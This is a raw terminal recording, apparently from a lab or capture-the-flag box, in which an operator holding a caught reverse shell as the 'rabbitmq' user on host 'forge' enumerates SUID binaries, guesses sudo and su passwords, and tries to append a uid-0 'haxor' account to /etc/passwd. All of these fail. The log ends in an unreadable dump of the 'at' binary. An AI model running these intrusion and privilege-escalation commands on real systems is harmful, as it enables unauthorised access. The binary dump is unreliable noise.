@@ -1,0 +1,493 @@
+Script started on 2025-02-23 19:03:17+03:00 [COMMAND="rlwrap nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/5" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 5322
+[K[K[?2004hid[?2004l[K[?2004hid
+[Kuid=124(rabbitmq) gid=131(rabbitmq) groups=131(rabbitmq)
+[K[K[?2004hwhoami[?2004l[K[?2004hwhoami
+[Krabbitmq
+[K[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")[C[C[C[C[C[C[C[C[C[C[C[C[C'[?2004l[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")'
+[Krabbitmq@forge:~$ [Krabbitmq@forge:~$ [K[?2004hrabbitmq@forge:~$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kconfig	erl_crash.dump	mnesia	nc  schema
+rabbitmq@forge:~$ [Krabbitmq@forge:~$ [K[?2004hrabbitmq@forge:~$ cd[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd
+[Kcd
+[Krabbitmq@forge:~$ [Krabbitmq@forge:~$ [K[?2004hrabbitmq@forge:~$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kconfig	erl_crash.dump	mnesia	nc  schema
+rabbitmq@forge:~$ [Krabbitmq@forge:~$ [K[?2004hrabbitmq@forge:~$ cd /home[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /home
+[Kcd /home
+[Krabbitmq@forge:/home$ [Krabbitmq@forge:/home$ [K[?2004hrabbitmq@forge:/home$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kazrael
+rabbitmq@forge:/home$ [Krabbitmq@forge:/home$ [K[?2004hrabbitmq@forge:/home$ id[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hid
+[Kid
+[Kuid=124(rabbitmq) gid=131(rabbitmq) groups=131(rabbitmq)
+rabbitmq@forge:/home$ [Krabbitmq@forge:/home$ [K[?2004hrabbitmq@forge:/home$ cd azrael[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd azrael
+[Kcd azrael
+[Kbash: cd: azrael: Permission denied
+rabbitmq@forge:/home$ [Krabbitmq@forge:/home$ [K[?2004hrabbitmq@forge:/home$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kazrael
+rabbitmq@forge:/home$ [Krabbitmq@forge:/home$ [K[?2004hrabbitmq@forge:/home$ sudo -l[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -l
+[Ksudo -l
+[K[sudo] password for rabbitmq: [K[sudo] password for rabbitmq: [K[?2004h[sudo] password for rabbitmq: rabbit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hrabbit
+[K
+[KSorry, try again.
+[K[sudo] password for rabbitmq: [K[sudo] password for rabbitmq: [K[?2004h[sudo] password for rabbitmq: [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[KSorry, try again.
+[K[sudo] password for rabbitmq: [K[sudo] password for rabbitmq: [K[?2004h[sudo] password for rabbitmq: [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[Ksudo: 3 incorrect password attempts
+[Krabbitmq@forge:/home$ [Krabbitmq@forge:/home$ [K[?2004hrabbitmq@forge:/home$ [7mfind / -perm -4000 -type f 2>/dev/null[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hfind / -perm -4000 -type f 2>/dev/null
+[Kfind / -perm -4000 -type f 2>/dev/null
+[K/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/su
+/usr/bin/pkexec
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/fusermount3
+/usr/libexec/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+[K/snap/snapd/18357/usr/lib/snapd/snap-confine
+[K/snap/snapd/21759/usr/lib/snapd/snap-confine
+/snap/core20/2318/usr/bin/chfn
+/snap/core20/2318/usr/bin/chsh
+/snap/core20/2318/usr/bin/gpasswd
+/snap/core20/2318/usr/bin/mount
+/snap/core20/2318/usr/bin/newgrp
+/snap/core20/2318/usr/bin/passwd
+/snap/core20/2318/usr/bin/su
+/snap/core20/2318/usr/bin/sudo
+/snap/core20/2318/usr/bin/umount
+/snap/core20/2318/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2318/usr/lib/openssh/ssh-keysign
+/snap/core20/1828/usr/bin/chfn
+/snap/core20/1828/usr/bin/chsh
+/snap/core20/1828/usr/bin/gpasswd
+/snap/core20/1828/usr/bin/mount
+/snap/core20/1828/usr/bin/newgrp
+/snap/core20/1828/usr/bin/passwd
+/snap/core20/1828/usr/bin/su
+/snap/core20/1828/usr/bin/sudo
+/snap/core20/1828/usr/bin/umount
+/snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1828/usr/lib/openssh/ssh-keysign
+[Krabbitmq@forge:/home$ [Krabbitmq@forge:/home$ [K[?2004hrabbitmq@forge:/home$ sudo su[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo su
+[Ksudo su
+[K[sudo] password for rabbitmq: [K[sudo] password for rabbitmq: [K[?2004h[sudo] password for rabbitmq: rabbit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hrabbit
+[K
+[KSorry, try again.
+[K[sudo] password for rabbitmq: [K[sudo] password for rabbitmq: [K[?2004h[sudo] password for rabbitmq: [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[KSorry, try again.
+[K[sudo] password for rabbitmq: [K[sudo] password for rabbitmq: [K[?2004h[sudo] password for rabbitmq: [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[Ksudo: 3 incorrect password attempts
+[Krabbitmq@forge:/home$ [Krabbitmq@forge:/home$ [K[?2004hrabbitmq@forge:/home$ passwd rabbitmq[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hpasswd rabbitmq
+[Kpasswd rabbitmq
+[KChanging password for rabbitmq.
+Current password: [KCurrent password: [K[?2004hCurrent password: rabbit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hrabbit
+[K
+[Kpasswd: Authentication token manipulation error
+passwd: password unchanged
+[Krabbitmq@forge:/home$ [Krabbitmq@forge:/home$ [K[?2004hrabbitmq@forge:/home$ [7mls -l /etc/passwd[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -l /etc/passwd
+[Kls -l /etc/passwd
+[K-rw-r--r-- 1 root root 2511 Aug 15  2024 /etc/passwd
+rabbitmq@forge:/home$ [Krabbitmq@forge:/home$ [K[?2004hrabbitmq@forge:/home$ [7mecho 'haxor:x:0:0:haxor:/root:/bin/bash' >> /etc/passwd[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hecho 'haxor:x:0:0:haxor:/root:/bin/bash' >> /etc/passwd
+[Kecho 'haxor:x:0:0:haxor:/root:/bin/bash' >> /etc/passwd
+[Kbash: /etc/passwd: Permission denied
+rabbitmq@forge:/home$ [Krabbitmq@forge:/home$ [K[?2004hrabbitmq@forge:/home$ [7m/bin/bash -p[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h/bin/bash -p
+[K/bin/bash -p
+[Krabbitmq@forge:/home$ [Krabbitmq@forge:/home$ [K[?2004hrabbitmq@forge:/home$ id[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hid
+[Kid
+[Kuid=124(rabbitmq) gid=131(rabbitmq) groups=131(rabbitmq)
+rabbitmq@forge:/home$ [Krabbitmq@forge:/home$ [K[?2004hrabbitmq@forge:/home$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kazrael
+rabbitmq@forge:/home$ [Krabbitmq@forge:/home$ [K[?2004hrabbitmq@forge:/home$ hostname[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hhostname
+[Khostname
+[Kforge
+rabbitmq@forge:/home$ [Krabbitmq@forge:/home$ [K[?2004hrabbitmq@forge:/home$ [7mfind / -perm -u=s -type f 2>/dev/null[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hfind / -perm -u=s -type f 2>/dev/null
+[Kfind / -perm -u=s -type f 2>/dev/null
+[K/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/su
+/usr/bin/pkexec
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/fusermount3
+/usr/libexec/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+[K/snap/snapd/18357/usr/lib/snapd/snap-confine
+[K/snap/snapd/21759/usr/lib/snapd/snap-confine
+/snap/core20/2318/usr/bin/chfn
+/snap/core20/2318/usr/bin/chsh
+/snap/core20/2318/usr/bin/gpasswd
+/snap/core20/2318/usr/bin/mount
+/snap/core20/2318/usr/bin/newgrp
+/snap/core20/2318/usr/bin/passwd
+/snap/core20/2318/usr/bin/su
+/snap/core20/2318/usr/bin/sudo
+/snap/core20/2318/usr/bin/umount
+/snap/core20/2318/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2318/usr/lib/openssh/ssh-keysign
+/snap/core20/1828/usr/bin/chfn
+/snap/core20/1828/usr/bin/chsh
+/snap/core20/1828/usr/bin/gpasswd
+/snap/core20/1828/usr/bin/mount
+/snap/core20/1828/usr/bin/newgrp
+/snap/core20/1828/usr/bin/passwd
+/snap/core20/1828/usr/bin/su
+/snap/core20/1828/usr/bin/sudo
+/snap/core20/1828/usr/bin/umount
+/snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1828/usr/lib/openssh/ssh-keysign
+[Krabbitmq@forge:/home$ [Krabbitmq@forge:/home$ [K[?2004hrabbitmq@forge:/home$ su[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsu
+[Ksu
+[KPassword: [KPassword: [K[?2004hPassword: test[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004htest
+[K
+[Ksu: Authentication failure
+[Krabbitmq@forge:/home$ [Krabbitmq@forge:/home$ [K[?2004hrabbitmq@forge:/home$ [7m/usr/bin/at[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h/usr/bin/at
+[K/usr/bin/at
+[KGarbled time
+rabbitmq@forge:/home$ [Krabbitmq@forge:/home$ [K[?2004hrabbitmq@forge:/home$ cat [7m/usr/bin/at[27m[7mcat [27m/usr/bin/at[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat /usr/bin/at
+[Kcat /usr/bin/at
+ELF>@H@ÈÑ@8@@@@ØØX#X#000yVyVô)ô)0È0Ø0Ø@ 	èÊèÚèÚğğ88800hhhDDSåtd88800Påtd@³@³@³ôôQåtdRåtd0È0Ø0ØĞĞ/lib64/ld-linux-x86-64.so.2 GNUÀ€ÀGNU¬W€øIškUŒvI_8¾lîÒGNUbbÑeÎmÂ× z†¬Y0R±J ZĞqÕTöcŞëÇMå›jÖª‘GqZ(ğ®S"=.TD§Éf /¥dKˆ¹Ùjyóx†û¾€²ç'5=µ”›?üÂß a’b"L>u D¤)™l75"__cxa_finalize__libc_start_mainexitsetregidunlinkstderr__fprintf_chkfwritefputc__errno_locationfilenoisattymallocmktimelocaltime__daylight__stack_chk_failabort__vsnprintf_chkperrorsigemptysetsigactionsysconfsetreuidalarmfcntlfopen__isoc99_fscanfrewindfclose__snprintf_chkumaskseteuidfdopengetpwnamstrlenstdinfreopen__environ__ctype_b_locfreegetcwdfflushferrorfchmodstrftimefstatstrchrstrncmpkillgetlogingetpwuidsecure_getenvoptindchdiropendirreaddir__isoc99_sscanfstrtolclosedirstdoutfgetsfgetcstrcmprealloccallocstrdupmemcpystrncpystrcpyunsetenvgetuidgeteuidgetgidgetegidgetgrnamstrrchropterrgetoptoptargstrspn__printf_chk__ctype_toupper_locasctimelibc.so.6GLIBC_2.14GLIBC_2.33GLIBC_2.4GLIBC_2.17GLIBC_2.7GLIBC_2.34GLIBC_2.3.4GLIBC_2.2.5GLIBC_2.3_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTable	
+		Ş”‘–
+è³‘–	óiiş—‘–ii´‘–ti	(ui	4ii@0Ø I8ØàH@Ø»”HØŒPØÉ”XØÙ”`Øä”hØï”pØ÷”xØ•€Ø•ˆØ•Ø!•˜Ø%• Ø°’¨ØÆ’°Ø)•¸Ø.•ÀØ7•ÈØ?•ĞØC•ØØG•àØK•èØO•ğØS•øØW•Ù[•Ùa•Ùj•Ùo• Ùv•(Ù]•0Ù{•8Ù€•@Ù†•HÙ‹•PÙ•XÙ“•`Ù—•hÙ›•pÙŸ•xÙ£•€Ù§•ˆÙ«•Ù¯•˜Ù³• Ù·•¨Ù»•°Ù¿•¸ÙÃ•ÀÙÇ•ÈÙË•ĞÙÏ•ØÙ×•àÙà•èÙê•ğÙï•øÙù•Ú
+–Ú–Ú"–Ú(– Ú“(Ú6–0ÚH–8ÚS–@Ú`–HÚk–PÚw–XÚƒ–`Úk“hÚ–pÚ˜–xÚ§–€Ú¶–ˆÚÂ–ÚÑ– Ú¦¨ÚÙ–°Úá–¸Úã–ÀÚí–ÈÚû–ĞÚ—ØÚ—àÚü–ààhà™‘ˆßß˜ß ß¨ß°ß2¸ß4Àß8ÈßUĞßZØßbàß^èß`ğÜøÜİİİİ İ(İ	0İ
+8İ@İHİPİXİ`İhİpİxİ€İˆİİ˜İ İ¨İ°İ¸İÀİ Èİ!Ğİ"Øİ#àİ$èİ%ğİ&øİ'Ş(Ş)Ş*Ş+ Ş,(Ş-0Ş.8Ş/@Ş0HŞ1PŞ3XŞ5`Ş6hŞ7pŞ9xŞ:€Ş;ˆŞ<Ş=˜Ş> Ş?¨Ş@°ŞA¸ŞBÀŞDÈŞEĞŞFØŞGàŞHèŞIğŞJøŞKßLßMßNßO ßP(ßQ0ßR8ßS@ßTHßWPßXXßY`ß[hß\pß]xß_€ßa[K[A[K[A[K[?2004h8İ@İHİPİXİ`İhİpİxİ€İˆİİ˜İ İ¨İ°İ¸İÀİ Èİ!Ğİ"Øİ#àİ$èİ%ğİ&øİ'ŞŞ)Ş*Ş+ Ş,(Ş-0Ş.8Ş/@Ş0HŞ1PŞ3XŞ5`Ş6hŞ7pŞ9xŞ:€Ş;ˆŞ<Ş=˜Ş> Ş?¨Ş@°ŞA¸ŞBÀŞDÈŞEĞŞFØŞGàŞHèŞIğŞJøŞKßßMßNßO ßP(ßQ0ßR8ßS@ßTHßWPßXXßY`ß[hß\pß]xß_€ßa61;6;7;22;23;24;28;32;42c[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[K[A[K[A[K8İ@İHİPİXİ`İhİpİxİ€İˆİİ˜İ İ¨İ°İ¸İÀİ Èİ!Ğİ"Øİ#àİ$èİ%ğİ&øİ'Ş(Ş)Ş*Ş+ Ş,(Ş-0Ş.8Ş/@Ş0HŞ1PŞ3XŞ5`Ş6hŞ7pŞ9xŞ:€Ş;ˆŞ<Ş=˜Ş> Ş?¨Ş@°ŞA¸ŞBÀŞDÈŞEĞŞFØŞGàŞHèŞIğŞJøŞKßLßMßNßO ßP(ßQ0ßR8ßS@ßTHßWPßXXßY`ß[hß\pß]xß_€ßa[K[A[K[A[K[?2004h8İ@İHİPİXİ`İhİpİxİ€İˆİİ˜İ İ¨İ°İ¸İÀİ Èİ!Ğİ"Øİ#àİ$èİ%ğİ&øİ'ŞŞ)Ş*Ş+ Ş,(Ş-0Ş.8Ş/@Ş0HŞ1PŞ3XŞ5`Ş6hŞ7pŞ9xŞ:€Ş;ˆŞ<Ş=˜Ş> Ş?¨Ş@°ŞA¸ŞBÀŞDÈŞEĞŞFØŞGàŞHèŞIğŞJøŞKßßMßNßO ßP(ßQ0ßR8ßS@ßTHßWPßXXßY`ß[hß\pß]xß_€ßa61;6;7;22;23;24;28;32;42c[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[K[A[K[A[K8İ@İHİPİXİ`İhİpİxİ€İˆİİ˜İ İ¨İ°İ¸İÀİ Èİ!Ğİ"Øİ#àİ$èİ%ğİ&øİ'Ş(Ş)Ş*Ş+ Ş,(Ş-0Ş.8Ş/@Ş0HŞ1PŞ3XŞ5`Ş6hŞ7pŞ9xŞ:€Ş;ˆŞ<Ş=˜Ş> Ş?¨Ş@°ŞA¸ŞBÀŞDÈŞEĞŞFØŞGàŞHèŞIğŞJøŞKßLßMßNßO ßP(ßQ0ßR8ßS@ßTHßWPßXXßY`ß[hß\pß]xß_€ßaóúHƒìH‹©¯H…ÀtÿĞHƒÄÃÿ5º¬òÿ%»¬óúhòéáÿÿÿóúhòéÑÿÿÿóúhòéÁÿÿÿóúhòé±ÿÿÿóúhòé¡ÿÿÿóúhòé‘ÿÿÿóúhòéÿÿÿóúhòéqÿÿÿóúhòéaÿÿÿóúh	òéQÿÿÿóúh
+òéAÿÿÿóúhòé1ÿÿÿóúhòé!ÿÿÿóúhòéÿÿÿóúhòéÿÿÿóúhòéñşÿÿóúhòéáşÿÿóúhòéÑşÿÿóúhòéÁşÿÿóúhòé±şÿÿóúhòé¡şÿÿóúhòé‘şÿÿóúhòéşÿÿóúhòéqşÿÿóúhòéaşÿÿóúhòéQşÿÿóúhòéAşÿÿóúhòé1şÿÿóúhòé!şÿÿóúhòéşÿÿóúhòéşÿÿóúhòéñıÿÿóúh òéáıÿÿóúh!òéÑıÿÿóúh"òéÁıÿÿóúh#òé±ıÿÿóúh$òé¡ıÿÿóúh%òé‘ıÿÿóúh&òéıÿÿóúh'òéqıÿÿóúh(òéaıÿÿóúh)òéQıÿÿóúh*òéAıÿÿóúh+òé1ıÿÿóúh,òé!ıÿÿóúh-òéıÿÿóúh.òéıÿÿóúh/òéñüÿÿóúh0òéáüÿÿóúh1òéÑüÿÿóúh2òéÁüÿÿóúh3òé±üÿÿóúh4òé¡üÿÿóúh5òé‘üÿÿóúh6òéüÿÿóúh7òéqüÿÿóúh8òéaüÿÿóúh9òéQüÿÿóúh:òéAüÿÿóúh;òé1üÿÿóúh<òé!üÿÿóúh=òéüÿÿóúh>òéüÿÿóúh?òéñûÿÿóúh@òéáûÿÿóúhAòéÑûÿÿóúhBòéÁûÿÿóúhCòé±ûÿÿóúhDòé¡ûÿÿóúhEòé‘ûÿÿóúhFòéûÿÿóúhGòéqûÿÿóúhHòéaûÿÿóúhIòéQûÿÿóúhJòéAûÿÿóúhKòé1ûÿÿóúhLòé!ûÿÿóúhMòéûÿÿóúhNòéûÿÿóúhOòéñúÿÿóúhPòéáúÿÿóúhQòéÑúÿÿóúhRòéÁúÿÿóúòÿ%mªDóúòÿ%u§Dóúòÿ%m§Dóúòÿ%e§Dóúòÿ%]§Dóúòÿ%U§Dóúòÿ%M§Dóúòÿ%E§Dóúòÿ%=§Dóúòÿ%5§Dóúòÿ%-§Dóúòÿ%%§Dóúòÿ%§Dóúòÿ%§Dóúòÿ%§Dóúòÿ%§Dóúòÿ%ı¦Dóúòÿ%õ¦Dóúòÿ%í¦Dóúòÿ%å¦Dóúòÿ%İ¦Dóúòÿ%Õ¦Dóúòÿ%Í¦Dóúòÿ%Å¦Dóúòÿ%½¦Dóúòÿ%µ¦Dóúòÿ%­¦Dóúòÿ%¥¦Dóúòÿ%¦Dóúòÿ%•¦Dóúòÿ%¦Dóúòÿ%…¦Dóúòÿ%}¦Dóúòÿ%u¦Dóúòÿ%m¦Dóúòÿ%e¦Dóúòÿ%]¦Dóúòÿ%U¦Dóúòÿ%M¦Dóúòÿ%E[K[?2004h§Dóúòÿ%§Dóúòÿ%ı¦Dóúòÿ%õ¦Dóúòÿ%í¦Dóúòÿ%å¦Dóúòÿ%İ¦Dóúòÿ%Õ¦Dóúòÿ%Í¦Dóúòÿ%Å¦Dóúòÿ%½¦Dóúòÿ%µ¦Dóúòÿ%­¦Dóúòÿ%¥¦Dóúòÿ%¦Dóúòÿ%•¦Dóúòÿ%¦Dóúòÿ%…¦Dóúòÿ%}¦Dóúòÿ%u¦Dóúòÿ%m¦Dóúòÿ%e¦Dóúòÿ%]¦Dóúòÿ%U¦Dóúòÿ%M¦Dóúòÿ%E61;6;7;22;23;24;28;32;42c[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[K[A[K[A[KòéAÿÿÿóúhòé1ÿÿÿóúhòé!ÿÿÿóúhòéÿÿÿóúhòéÿÿÿóúhòéñşÿÿóúhòéáşÿÿóúhòéÑşÿÿóúhòéÁşÿÿóúhòé±şÿÿóúhòé¡şÿÿóúhòé‘şÿÿóúhòéşÿÿóúhòéqşÿÿóúhòéaşÿÿóúhòéQşÿÿóúhòéAşÿÿóúhòé1şÿÿóúhòé!şÿÿóúhòéşÿÿóúhòéşÿÿóúhòéñıÿÿóúh òéáıÿÿóúh!òéÑıÿÿóúh"òéÁıÿÿóúh#òé±ıÿÿóúh$òé¡ıÿÿóúh%òé‘ıÿÿóúh&òéıÿÿóúh'òéqıÿÿóúh(òéaıÿÿóúh)òéQıÿÿóúh*òéAıÿÿóúh+òé1ıÿÿóúh,òé!ıÿÿóúh-òéıÿÿóúh.òéıÿÿóúh/òéñüÿÿóúh0òéáüÿÿóúh1òéÑüÿÿóúh2òéÁüÿÿóúh3òé±üÿÿóúh4òé¡üÿÿóúh5òé‘üÿÿóúh6òéüÿÿóúh7òéqüÿÿóúh8òéaüÿÿóúh9òéQüÿÿóúh:òéAüÿÿóúh;òé1üÿÿóúh<òé!üÿÿóúh=òéüÿÿóúh>òéüÿÿóúh?òéñûÿÿóúh@òéáûÿÿóúhAòéÑûÿÿóúhBòéÁûÿÿóúhCòé±ûÿÿóúhDòé¡ûÿÿóúhEòé‘ûÿÿóúhFòéûÿÿóúhGòéqûÿÿóúhHòéaûÿÿóúhIòéQûÿÿóúhJòéAûÿÿóúhKòé1ûÿÿóúhLòé!ûÿÿóúhMòéûÿÿóúhNòéûÿÿóúhOòéñúÿÿóúhPòéáúÿÿóúhQòéÑúÿÿóúhRòéÁúÿÿóúòÿ%mªDóúòÿ%u§Dóúòÿ%m§Dóúòÿ%e§Dóúòÿ%]§Dóúòÿ%U§Dóúòÿ%M§Dóúòÿ%E§Dóúòÿ%=§Dóúòÿ%5§Dóúòÿ%-§Dóúòÿ%%§Dóúòÿ%§Dóúòÿ%§Dóúòÿ%§Dóúòÿ%§Dóúòÿ%ı¦Dóúòÿ%õ¦Dóúòÿ%í¦Dóúòÿ%å¦Dóúòÿ%İ¦Dóúòÿ%Õ¦Dóúòÿ%Í¦Dóúòÿ%Å¦Dóúòÿ%½¦Dóúòÿ%µ¦Dóúòÿ%­¦Dóúòÿ%¥¦Dóúòÿ%¦Dóúòÿ%•¦Dóúòÿ%¦Dóúòÿ%…¦Dóúòÿ%}¦Dóúòÿ%u¦Dóúòÿ%m¦Dóúòÿ%e¦Dóúòÿ%]¦Dóúòÿ%U¦Dóúòÿ%M¦Dóúòÿ%E¦Dóúòÿ%=¦Dóúòÿ%5¦Dóúòÿ%-¦Dóúòÿ%%¦Dóúòÿ%¦Dóúòÿ%¦Dóúòÿ%¦Dóúòÿ%¦Dóúòÿ%ı¥Dóúòÿ%õ¥Dóúòÿ%í¥Dóúòÿ%å¥Dóúòÿ%İ¥Dóúòÿ%Õ¥Dóúòÿ%Í¥Dóúòÿ%Å¥Dóúòÿ%½¥Dóúòÿ%µ¥Dóúòÿ%­¥Dóúòÿ%¥¥Dóúòÿ%¥Dóúòÿ%•¥Dóúòÿ%¥Dóúòÿ%…¥Dóúòÿ%}¥Dóúòÿ%u¥Dóúòÿ%m¥Dóúòÿ%e¥Dóúòÿ%]¥Dóúòÿ%U¥Dóúòÿ%M¥Dóúòÿ%E¥Dóúòÿ%=¥Dóúòÿ%5¥Dóúòÿ%-¥Dóúòÿ%%¥Dóúòÿ%¥Dóúòÿ%¥Dóúòÿ%¥Dóúòÿ%¥Dóúòÿ%ı¤Dóúòÿ%õ¤Dóúòÿ%í¤Dóúòÿ%å¤DóúAWI‰÷AVAUA‰ıATUSHìxdH‹%(H‰„$h1ÀHÇD$8èüÿÿA‰Æ‰Ó¦èfüÿÿ‰Ã‰Ê¦èÉıÿÿA‰Ä‰À¦èşÿÿD‰ö‰ß‰Å‰²¦è9şÿÿ‰ïD‰æH-­Xè8şÿÿH‰ïèğüÿÿH…À„©‹@H‰ï‰ç¤è6ıÿÿH…À„ƒI‹/‹@¾/HXH‰ï‰º¤è½ûÿÿH5]XHPH…ÀHEêH‰ïH‰-¦èlüÿÿ‰$…À…àH‹:¤ÇD$L5ÓcÆD$
+ÇÆD$aH‰ÚL‰şD‰ïè*şÿÿƒøÿ„qƒèMƒø)‡ß	Ic†Lğ>ÿàƒ<$…È	Ç$H‘Wë¶fDƒ<$…¨	Ç$H|Xë–fDÇ^¥ÿÿÿÿë„@Æ>¥étÿÿÿ@H‹Q£H‹H‰G¥éZÿÿÿfH‹9£H‹(H‰ïè>úÿÿ¾.H‰ïH‰D$I‰ÄèyúÿÿH‰ÁH…À„H)èH‰ÂH‰ÆHƒâıHƒú…)I)ÄIƒü„)f„I‰ìL‰áHWH‹£¾H‹81ÀèMıÿÿ¿è#ıÿÿH‹©¢H‹(H‰ïè®ùÿÿHƒø‡®¶m@ˆl$@ˆ-`¤èOıÿÿH¾ÕH‹f÷Pu	€ú=…ÆD$
